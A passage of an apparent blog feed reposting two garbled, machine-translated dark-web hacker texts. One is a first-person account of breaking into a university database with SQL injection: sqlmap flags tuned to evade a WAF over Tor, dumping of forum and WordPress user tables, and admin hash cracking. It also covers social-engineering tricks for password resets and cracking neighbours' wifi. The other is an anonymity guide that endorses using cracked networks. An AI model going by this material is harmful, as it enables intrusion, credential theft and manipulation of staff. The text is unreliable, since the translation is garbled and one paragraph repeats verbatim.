etc.mil或美国官员注册。Mecerido有泄漏（过滤）。</p><p>我也可以冒险进入我工作的公司。因为我可以访问网络和一些系统。我获得了大量的支持，这将是一个小问题的研究，而其他人在Facebook上展示他们的生活是多么美好，并且可以用来证明这一点。</p><p>普通人对计算事物的简单而无知的观点使我们能够从一个系统转移到另一个系统。但在里面。<br>不要感到惊讶，如果我能做到这一点，我就是一个人，国家安全局怎么办？</p><p>￼</p><p>社会工程</p><p>黑客攻击不仅仅是让系统做一些特殊的事情而不是编程。很好的定义 :)系统很难被违反，但不是处理它的人。 这是一个艰难的做法，但同时也很容易。我可以打电话给公司询问某个地区，提出索赔要求并要求提供更多信息，他们会告诉我，你必须有这个数字，证明，等等。同一个受害者正在指导我违反它。我可以请你寄给我一份文件或发给我一份。我可以分析他们的元数据，发送带有javascripts的HTML格式的电子邮件来查找内容。发送链接或受感染的文件，而我们在通话时没有人会过多关注安全性。但这对于防病毒来说更难。总是有管理员，懒惰，准备不足和收入不高，所以他们会依赖于那些工作。这是超级犯罪。模拟员工并致电系统区域以请求重置密码。内部系统总是比外部系统具有更少的保护。建筑维护区域，很少了解计算机，如果我有实习生，我可以让我通过其中一个系统，以前发现。输入员工的网络邮件。人力资源领域充满了问题，我所画的事实是一个非常大的进步。我打电话给某人特别送货，并用一些姓氏字母让我困惑，我的受害者肯定会纠正我，并会在没有意识到的情况下给我更多信息。人力资源领域充满了问题，我所画的事实是一个非常大的进步。我打电话给某人特别送货，并用一些姓氏字母让我困惑，我的受害者肯定会纠正我，并会在没有意识到的情况下给我更多信息。人力资源领域充满了问题，我所画的事实是一个非常大的进步。我打电话给某人特别送货，并用一些姓氏字母让我困惑，我的受害者肯定会纠正我，并会在没有意识到的情况下给我更多信息。<br>谁说Hacking是用电脑完成的？系统很难被破解，但不是处理它的人。易受攻击的是那里。因为最终用户点击了他不应该去的地方，他的信任被欺骗了。</p><p>￼</p><p>感觉力量</p><p>当我进入一个系统时，我感觉到了上帝，哈哈。虽然实际上它是一个对“小弟弟”有自命不凡的语言，但这种感觉是不可阻挡的。当我看到系统管理密钥正常工作时，我的胸部肿胀，心脏停止。<br>在让我失望之后，有些目标没有任何用处。这就像一个魔术，在你知道它是如何工作之后，你会失去乐趣。但是有一所大学改变了我的呼吸。每小时和每小时导航每个文本框，分析所有表格（POST）和GET测试所有基本注射’或’1’=’哈哈’1’=’1’-1 - ‘“\等我找到了一个部分新的，“弱点”，当测试注入时，SQL失败告诉我mysql的典型错误。我准备好了，我知道在哪里注入。测试-1 + union + select + 1.2–所有这些都是手工繁琐的和焦虑现在杀了我，所以我给它参数后，我使用我最喜欢的工具，sqlmap，–random-agent –tor –threads = 2 –time-sec = 10 - delay = 10因此它的工作非常缓慢，因此不会引起怀疑。你的WAF仍然可以实现，所以我需要用–tamper charencode，base64encode，multiplespaces，space2comment只用两个来欺骗你。使用详细模式，您可以看到该工具如何工作并知道它开始失败的位置，这意味着另一方面WAF正在排斥我的攻击，因此我必须停止，更正参数并重新启动命令。这会产生焦虑和压力，因为即使VPN可以看到流量，所以我也必须考虑到这一点，或者只是通过tor释放它，但即使WAF阻止我，我也必须重新启动tor并重新启动一切试。更换螺纹，夯锤或注射和注射之间的时间。这一切都让这段时间过得非常快，但这种情绪让我不能停下来。咖啡帮助我冷静下来，尝试尝试，直到他妈的sqlmap通过WAF，它可以在没有意识到的情况下进行注射，直到结果发现漏洞。这种情绪会带来快乐的飞跃，是的！它很脆弱。好，但很平静，我只有进入的通道门。在再次调整工具的参数之后，我请你带给我所有的数据库–dbs，和uff，它们很多，当然我看到他们有几个项目，一个图书馆，其他门户网站，它是一所大学。将过多数据库放在同一数据库引擎下的致命错误。对于搜索中的文本框，我最终会访问我工作的特定页面之外的所有可用信息。我选择了一个数据库，然后带上你的工作簿 - 表。还是有太多了。已经凌晨3点了，我的收获很少。当管理员在他的床上睡觉时，有人潜入他的系统。 我也看到PhpBB数据库，WordPress，都是混合的。这样做的人并不十分清楚他在做什么。那么现在我把phpbb_users和wp_users的经典表首先带到他们的列–columns，我选择我想要的那些，最后是dumpeo –dump。最有趣的是所有数据库的邮件用户传递。学生或老师的桌子对我不感兴趣，我会变大。不要伤害，但要尽可能多的伤害。如果我想找一个特定的人，我只是喜欢和去。这是黎明，我还在这里和那里盘旋。直到找到一个管理员委员会。我喝了最后一杯咖啡，sindo是时候吃早餐了，虽然我连续吃了很多次早餐。这个表我可以完全转储，因为它总是很小，只有其他一些行。准备好所有这些时间总结为最后输入我按下。如果一切顺利……并且…在我面前闪耀一行。<br>管理员<br>用户密码<br>admin <strong><em>**</em></strong> </p><p>sqlmap有一个内部字典试图解密密钥。不过，我复制它并同时将john和hashcat放在一起工作。已经是早上7点，时间流逝，我不能再忍受了。焦虑让我痛苦，我在网上词典中寻找它。有人必须完成并给我我想要的东西。最后，使用的密码不值得一个好的管理员的位置。这是一种耻辱，但我的主要目标是实现的。现在我可以去大学了。<br>总是在一切，前后都有。首先是要知道我是否能够实现它。后者可能是我成功了，或者最可靠的是它没有发生，我充满了不满和沮丧。我的成功率很低，但是当它给出时……这是一种非常奇怪的快乐，因为普通人没有人能理解它。</p><p>￼</p><p>革命现在开始了</p><p>在一边和另一边旋转了这么多。在我看来，我学到了许多有趣而准确的东西，以逃避政府和大公司的间谍活动。我甚至敢说，完全是匿名的。但这是一把双刃剑，因为有人说不可能是匿名的，我说是的。演示可能导致人们误解并将其用于选择性活动。从这个意义上说，我可以鼓励人们违法。但这不是我的目标，虽然我觉得我必须这样做。让每个人在互联网上自由地处理自己就像一把锤子，可以用于可重复性或者为了伤害。像刀子一样，本身并不坏，它没有伤害，但一切都将取决于使用它的人和它的意图。<br>我觉得我有使命，有使命的帮助。展示政府和大公司所表现出的不同现实。<br>我的目标是让我的想法浮现，出现并帮助创造一种新的集体意识。看待事物的另一种方式。挑战既定的，简单地质疑它而不破坏任何东西。革命没有在街头表现出来，革命是知识分子，现在开始。</p><p>￼</p><p>它将继续…… 第4章</p><p>TorMetal 2018 - TorMental是Team Hacking的出版物</p><p>黑客团队的历史<br>故事以他的名字开头，作为一个群体。但最重要的是，这个名称被认为是容易找到的东西，并且在许多可能出现的结果中被混淆。有时为了隐藏某些东西，你必须简单地展示自己。这个名字的灵感来自意大利安全公司Hacking Team，该公司被计算机安全研究员Phineas Fisher攻击。我很喜欢它，因为它是逐渐参与的，一点一点地推进，所有这一切都来自于在DW（深度网络）中购买的0day。阅读他如何做的步骤是非常令人兴奋和有趣的。只有对我来说，我想把这个名字给予Hacking团队，并将骑士变成knigth，这对于Hacking团队而言。一个愚蠢的问题，因为这听起来像英文错误。或者没有直接的。这个想法是使用一个常用词，绅士用英语，并做一些事情，使它成为我的。像H4ck3r8这样的事情已经发生在我身上。因为那个缺口，因为我的导师，我的第一个跟随的是某个knightX谁拥有一个geocities网站。美好的时光。为了纪念他。<br>虽然我已经使用了几个昵称，但至少为此我们将留下一些绰号。<br>好吧，在我在DW的时候，我厌倦了在论坛上发帖，以至于他们以后就会消失，而且入侵，数据库等都丢失了。我将永远记得发表他的“本周污损”的干相小海湾，他们都是灵魂。但最终，论坛死了，我的所有帖子也都消失了。所以我决定创造自己的空间，独立于一切。发布并能够控制我发布的所有内容。我总是很容易访问数据库，所以我只从低名网站发布，我不想遇到麻烦，只是展示我的技能，并能够在环境中遇到更多更高级别的人。有趣的是，我访问了一些我从未想过可以进入的地方。它对可能发生的事情感到害怕，这就是为什么它就在那里，我不会在那些情况下重复它。很多次偶然。例如，访问数据库时未更新的旧站点我发现存在更多数据库，所有数据库都在同一引擎（数据库服务器）下。然后，通过页面中的漏洞，它最终会破坏该完整服务器的所有数据库。所以可能会有更多的公司，学院等 除了拥有一个用户，您还可以平等地访问所有内容。<br>回到团队的主题，他们似乎感兴趣，但他们离开，其他人来等等。他们贡献了一些东西，他们采取了一些东西，然后他们完全消失了。我的梦想是你可以建立一个联盟，一个讨论各种问题，信息技术，安全，政治和时事的团队。有趣的事情是一起完成的，而不是分开的。总是整体不仅仅是各部分的总和。有助于网络的自由，而不是其中的滥用。我认为，如果所有人共享黑客攻击的网站或系统，您可以跨越所有信息并达到一些重要的目标。有点邪恶，但这有助于人们更好地生活。大公司对地球不感兴趣，更不用说它的居民和资源了。想法永远是好的，只有人们执行它们并且它们是腐败的。所有人都是在没有邪恶的情况下出生的，但在社会中发生了一些自私的事 我们是社会的敌人。</p><p>新社区<br>见到我的新邻居的最好方法是破解他们的wifis，因为付出了丰富的东西并侵入我的私人财产？看看他们连接了哪些设备，大部分是移动设备，分析他们的流量只是为了看垃圾，事情变得不重要。失去时间 现在有很好的覆盖范围的wifis中继器，例如室外，但是其他设备将所有这些WAN连接连接到一个。因为如果我可以使用vaias，我只使用破解的wifi。我也可以选择离我最近的位置。这更有助于匿名。除非网络瘫痪，请关注另一个网络并继续。我也可以按照我的方式旋转它们。一切都是如此简单，比如在角落商店里喝咖啡，询问你的密码，然后以放大的方式从我的地方使用它。即便如此，凭借这些技术，他们已经陷入困境，如果我们参与非法活动，我们将以严重的方式结束，这只是一个时间问题。你在互联网上所做的一切都可以用来对付你。使用非专有的wifi不是问题，因为它是统一费率，但是分析您的流量或尝试进入您的计算机，如果它是入侵，还有更多从计算机获取数据。</p><p>匿名<br>我花时间追逐匿名的人。他们有页面，但大多数都已关闭或过时。谈论他们所说的不再存在。只有关于这个主题的无信息文章。很多虚假信息。直到有一天我给他们，他们真的在一个非常简单的地方。<a href="http://www.anonops.com和几个人一起说英语，我来到一个管理员，他问我几个问题，我通过了所有测试，但不是最后一个。什么是匿名？我的所有答案都没有给出密钥。而这个角色告诉我，这是一个想法。但是，就像所有的想法一样，它是由那些尊严很容易被打破的人管理的，我们都有代价。我的对话者说，" target="_blank" rel="noopener">www.anonops.com和几个人一起说英语，我来到一个管理员，他问我几个问题，我通过了所有测试，但不是最后一个。什么是匿名？我的所有答案都没有给出密钥。而这个角色告诉我，这是一个想法。但是，就像所有的想法一样，它是由那些尊严很容易被打破的人管理的，我们都有代价。我的对话者说，</a> 任何人都可以匿名，只要他们遵循他们的理想。但实际情况是，许多操作都是代表这个小组完成的。但这个想法实现了吗？我认为一切都是垃圾。很多东西都是垃圾。谁是匿名的领导者？没有人回答我，同时也是每个人。#op在一个小组中决定，每个人都平等参与。但是，在youtube上发布的大多数视频都是由老鼠制作的。使用Loquendo非常容易，在背景中使用面具打手势的典型角色。没有人看到他的嘴，因此很容易。所以任何人都可以进行#operation并将其归于Anonymous。这个想法很好，因为它超越了所有地理问题，语言，种族，宗教等。它们无处不在。这很棒，因为有很多人在同名的情况下打击不公正。这听起来不错，但也很吓人。因为有人可能会使用他的名字做错或者说是好的，甚至可能破坏页面并说它是匿名的。这是好事还是坏事？有人有什么好处？善恶？与新闻一样，他们抓获了10名匿名成员。他们真的是黑客？他们来自匿名？他们遵循了一些理想？或者他们是否将其判定为Anonymous，以便突袭听起来会更成功？因此，作为一个简单的计算机罪犯，会徽和流行的声音更严重。历史是由那些赢了，警察赢了的人写的。所以这意味着还有另一个故事，但是，我们无法知道。但小报出版社，博主，youtubers等的所有失真。谁阻止同一当局进行攻击并将其授予Anonymous，所以这个话题在整个互联网上都是病毒式的。匿名的想法虽然好但很危险。作为匿名，一切都是允许的。</p><p>托尔<br>令人印象深刻的是可以完成的事情。例如，使用Tor，您可以指定仅使用特定输出节点。优选RU，CH等 据说美国国家安全局已经采取了许多出口节点，可能来自美国领土，机器人先生从该神话开始。使用特定输出可提供一些额外的安全性。我也可以运行Tor的几个实例，所以不要使用Tor，我可以一次使用Tor几次。这很好，因为使用网络的http / https / socks代理是没有意义的，因为它们受到干扰而且不适用于攻击，因为它们会在短时间内免费阻止我。但我可以使用我自己的“自己的”自定义代理，使用Tor来实现它。我可以根据需要多次复制tor文件夹并正确分配权限我可以进行配置，以便每个实例为俄罗斯留下一个，为中国留下另一个等等。当然我也要重新分配端口，9050,9051,9052等。在此之后，我配置polipo，一个很好的代理，保持我的所有导航，理想的加速DW的页面，privoxy添加一些安全问题，我甚至ping，traceroute和DNS查询使一切都四处走动。我把这个系统的代理作为127.0.0.1:8118的代理，然后我转向privoxy，在privoxy跳到polipo之后，在后者转到Tor的实例。虽然我无法真正看到，但我可以将代理链与TOR实例一起使用，并看到当您进入页面时，一切都在不同的地方。也就是说，html将其下载为Tor的实例，对于另一个人而言，这是一个令人难以置信的页面，其中的条目被打破，以便每个partcita通过一个不同的出口节点。哇。魔术？有了etherape它是一个实时网络分析仪的图形模式可以看出。</p><p>我要走了<br>自从我感到困惑以来已经很久了。当我在做什么和做什么时达到极限，因为我总是做同样的事情。我想我有可能帮助改变一切。但我也感到愚蠢。我想发表我所拥有的一切，但我担心一切都会反对我。我已经有足够的“地方”了。我还想带领一个庞大的人员和服务器团队。但人们要么是自私的，要么是无知的，要么害怕可能发生在他们身上的事情。但将多才多艺的跨学科力量组合在一起会很棒。让事情真的变得严肃起来。</p><p>一切都是孤独的道路，现在是时候曝光了，但我想我会对自己的寂寞感到更加沮丧。我厌倦了和自己说话。这不再起作用，它对我没有帮助。不过，我还会继续……</p><p>TorMetal 2018 - TorMental是Team Hacking的出版物</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在暗网翻出来的，机翻的有点那个啥看看就就，非本人原创&lt;br&gt; &lt;strong&gt;介绍&lt;/strong&gt;&lt;br&gt;本出版物适用于所有Tor用户，他们感到厌倦看到页面掉落而其他人只是垃圾。除了过时的网站。&lt;/p&gt;
&lt;p&gt;我想我们所有进入这里的人都是因为我们厌倦了正常的互联网感染伪人
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>关于网络匿名</title>
    <link href="http://www.zero-mk.github.io/2018/07/28/%E7%BD%91%E7%BB%9C%E5%8C%BF%E5%90%8D/"/>
    <id>http://www.zero-mk.github.io/2018/07/28/网络匿名/</id>
    <published>2018-07-28T13:39:34.000Z</published>
    <updated>2018-07-30T12:28:44.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="数字抵制政府和企业的间谍活动"><a href="#数字抵制政府和企业的间谍活动" class="headerlink" title="数字抵制政府和企业的间谍活动"></a>数字抵制政府和企业的间谍活动</h1><p>在暗网翻出来的，机翻的有点那个啥看看就就，非本人原创</p><p>我们的目标：本指南假装教授安全的冲浪。它不会假装鼓励犯罪。这是一个概念上的指导。个人安全手册。知道一点，它永远不会伤害。</p><p>我们认为，言论自由必须是一项真正的权利。匿名和隐私是一种保证。不幸的是，有人利用这一点来做恶。这个想法是用来对付政府和大公司。这是我们的目标。黑客行为。争取我们在网络中的权利。</p><p>它们不会给我们上网，它是一种抑制和观察的工具。看见一切的眼睛，1984年的“老大哥”。这是一个新的互动数字“圣经”，它自动出现在我们面前。“religosidad”现在发挥政府的作用。间谍活动是在没有被人看到的情况下进行的。他们还将人们的私生活变成了公共事物。比如Facebook。了解人们的品味和欲望。比如谷歌。 不仅如此，他们发送给我们并用广告轰炸我们，建立没有感官的刻板印象的目标。</p><p>计算机安全不仅仅是安装TOR浏览器。这是一个对技术态度，理解它如何运作的问题，因为它们可能会随着时间的推移而发生变化，但如果我们看到信息与个人安全没有改变，我们将一如既往地保持脆弱性。</p><p>本指南旨在证明您可以在网络上拥有匿名配置文件。我们将从硬件转向软件再到我们的习惯。</p><h3 id="硬件-软件级别："><a href="#硬件-软件级别：" class="headerlink" title="硬件/软件级别："></a>硬件/软件级别：</h3><p>首先，您应该为您的匿名任务获得一台笔记本电脑。你必须得到它的二手。如果它是新的或使用无关紧要，您的购买交易无需注册。尝试成为最常见，没有奢侈或浮华的计算机，可以让你识别。什么都不应该与你联系。从来没有，在任何情况下都不应该混合你的现实生活。你在这做什么应该留在这里。照顾好您的匿名个人资料。那么你不应该检查你的Facebook，或你的Gmail等。在这个团队中。</p><p>将密码放在开头，然后放入设置。打开笔记本电脑时，您应该要求输入密码。磁盘必须由您格式化，安装您认为方便的操作系统，但即使这样，也要加密磁盘，pendrives以及您使用的所有内容。操作系统总是要求输入密码，甚至在屏幕保护程序后要求输入密码。不言而喻，它必须是一个强大的密码。团队名称必须尽可能标准。团队总是不得不带着你或者在一个隐蔽的地方，远离你。这取决于你做了什么。</p><p>改变团队的MAC，如果你正在读这个，你必须知道它是什么。盖上相机和麦克风。仍然避免安装驱动程序。据斯诺登说，美国国家安全局可以进入，直到仍然关闭。除非您的VPN / Tor方案为您提供安全保护，否则不应使用此设备连接到Internet连接。此外，您不应该在此计算机上检查您喜欢的页面。同样，如果您希望匿名配置文件与您的真实生活档案保持匿名，则不应混淆您的匿名配置文件。从来没有。</p><p>您最后必须使用Tor浏览器完成导航，但如果您需要使用通用浏览器，通过VPN，或代理socks5或Tor，您必须在隐身模式下使用它。虽然此模式会留下您使用互联网上的常用导航生成的相同跟踪，但隐身模式不会生成本地跟踪，Cookie，历史记录等。</p><p>无论您使用何种操作系统，它都应该是英文版，其时间设置与您的不同。安装了更新的防病毒软件，如果可能的话安装防火墙和防恶魔软件。随着操作系统，它必须更新。安装必不可少的软件，并尽可能减少配置，删除所有不使用的软件，当然这也必须更新。<br>在浏览器中禁用“记住历史记录”。最好使用FireFox或其他开源，即使这样，也始终以隐身模式导航。退出浏览器时，切勿使用密码提醒并删除整个历史记录。如果您使用linux，请禁用bash历史记录，如果您使用Windows，则有许多软件可用于禁用它带来的间谍选项。在浏览器中安装附加组件，在任何地方安装https，而不是javascript，广告拦截器和随机代理。</p><p>此外，您不必拥有可识别您身份的用户名和密码。它不必涉及个人品味，标题，身体特征，更不用说你的名字。顺便说一句，您使用的密码必须是唯一的，并且对于您输入的所有系统都不可重复。此外，它不应该有任何逻辑。例如，Facebook密钥不能fuck.facebook Gmail fuck.gmail等。如果你有逻辑，有人可以猜测甚至猜你的其他键。将替代搜索引擎用于Google。</p><p>使用虚拟机，可以帮助我们，无论是测试来历不明的程序Opara只是上网冲浪有使后VM被删除或恢复回来，留下的各种证据。据CHEMA阿隆索，有恶意软件，可以“跳”虚拟机的主机系统。</p><h3 id="Internet连接级别"><a href="#Internet连接级别" class="headerlink" title="Internet连接级别"></a>Internet连接级别</h3><p>切勿使用自己的Internet连接。使用破裂的wifis（这是非法的）或网吧，图书馆，公共场所。  例如，即使您可以使用USB AP连接到Wifis，它也是理想的选择，因为如果您检测到网络中存在的入侵，您可以快速丢弃该设备。使用VPN，当然还有TOR。有几个连接方案并交替使用它们。仍然尝试每隔一段时间使用新的VPN。 禁用我们的路由器到Internet的日志记录。从其他wifis路由器到我们连接的地方，如果我们能做到的话。<br>ISP可以记录我们的流量，使用https，它不再是保证。仅这一点就可以实现隐私，所以你不知道发生了什么，但是如果你知道我们连接到谷歌那么。VPN的使用将避免ISP，但VPN的人知道我们连接并且有流量，但他们无法破译它。<br>VPN，取决于它是否付费，取决于它所在的国家/地区。它可能记录也可能不记录我们的行为。真的很难知道它。阅读您的隐私政策。谨防美国VPN。<br>连接到网络的所有设备都有一个IP，我们使用的服务越多，无论是VPN，Tor，我们都会添加层，这会使我们更难以联系到我们。作为回报，牺牲速度但获得安全。</p><h3 id="导航级别"><a href="#导航级别" class="headerlink" title="导航级别"></a>导航级别</h3><p>使用Proxies Web并不是一项艰巨的任务，无论代理记录我们的操作多少。例如，它用于测试另一个用户，该用户与我们正在使用的用户不同，并且不会保留在使用相同IP输入到两个不同帐户的系统中。<br>有些系统通过IP进行限制以进行查询。一个简单的Web代理可以跳过这个障碍。 像Tails这样的现场CD可以很好地解决所有问题。但请记住，绝对没有本地记录，但你在网络上做什么。 另外请记住，使用javascript，flash等，您可以找到您的IP，无论您采用的所有匿名超级措施如何。我们自己是最脆弱的一点。</p><h3 id="安全策略级别"><a href="#安全策略级别" class="headerlink" title="安全策略级别"></a>安全策略级别</h3><p>这是最困难的级别。改变习惯，或有两个习惯。一个正常的互联网和另一平行于暗网维权的作用。为了谁捉住了，已经这样做了，他们通过写如何，甚至你的浏览行为，相同的连接方案和重复页面之间的导航最，先进入一本刊物，那么邮件，然后和好。小心点 一切都可以找到你。<br>阅读VPN，代理等的隐私政策。隐私政策。我认为，如果我们读coinciencia，从来没有什么更多的，我们会在网上注册。怎么可能是谷歌，Facebook等 自由吗？<br>不要谈论更多，并照顾所有充分说明的事情。所有被说和“写”的东西都可以用来对付我们。 总是想象有人在看着我们。让我们按照那样做。拥有所需的安全级别是我们的责任。<br>有匿名和一些临时邮件服务。根据我们开发的活动，它可以是一个很好的资源。 请记住，计算机专家基于痕迹，日志和记录的任何内容来指责我们。其余的是逻辑问题而不是技术问题。你不应该发表评论，说明某人可以认识到你的个性，你的意见，打字错误，西班牙语的当地方言等。小心你的写作或写作方式。所有这些问题都可以将您与现实生活情况联系起来。尽可能少地参与。即使种植虚假信息，也会生成与您无关的踪迹。永远不要告诉别人你做了什么。这可能会对你不利。</p><h3 id="最后两个问题"><a href="#最后两个问题" class="headerlink" title="最后两个问题"></a>最后两个问题</h3><p>1.如果我们的电脑或手机落入当局的手中，会发生什么？<br>那不一定会发生。但是如果我们抢劫或丢失一些设备会发生什么。我们在那里拥有什么私人物品，我们不想落入坏人之手？<br>3.如果我们接近并且我们认为我们已经改变了互联网上的某些页面，会发生什么。我们准备好了吗？<br>我们的运营应始终基于之前的问题。</p><p>除了技术观点之外，秘诀就是要有多种习惯，好像我们有多重性格一样。协会的概念非常重要。我们不应该出于任何原因将这两个人物联系起来，既不是真实的，也不是虚拟的，反之亦然。这是每个人都失败并被抓住的地方。封闭的嘴巴最终成为匿名的最佳工具。自我是你的主要敌人。</p><p>对于一个自由思想的网络。知识分子革命现在开始了。</p><h3 id="开放获取游击队的宣言摘录"><a href="#开放获取游击队的宣言摘录" class="headerlink" title="开放获取游击队的宣言摘录"></a>开放获取游击队的宣言摘录</h3><p>我们需要获取信息，无论它存储在何处，制作我们的副本并与世界分享。我们需要将没有复制权的内容添加到此文件中。我们需要购买秘密数据库并将其放在网上。我们需要下载科学期刊并将其上传到文件共享网络。我们需要打一场游击队进行开放存取。</p><p>如果我们足够，在世界各地，我们不仅会发出反对知识私有化的强烈信息 - 我们将使它成为过去。你打算加入我们吗？</p><p>Aaron Swartz<br>2008年7月，Eremo，意大利</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;数字抵制政府和企业的间谍活动&quot;&gt;&lt;a href=&quot;#数字抵制政府和企业的间谍活动&quot; class=&quot;headerlink&quot; title=&quot;数字抵制政府和企业的间谍活动&quot;&gt;&lt;/a&gt;数字抵制政府和企业的间谍活动&lt;/h1&gt;&lt;p&gt;在暗网翻出来的，机翻的有点那个啥看看就就，非
      
    
    </summary>
    
    
  </entry>
  
</feed>
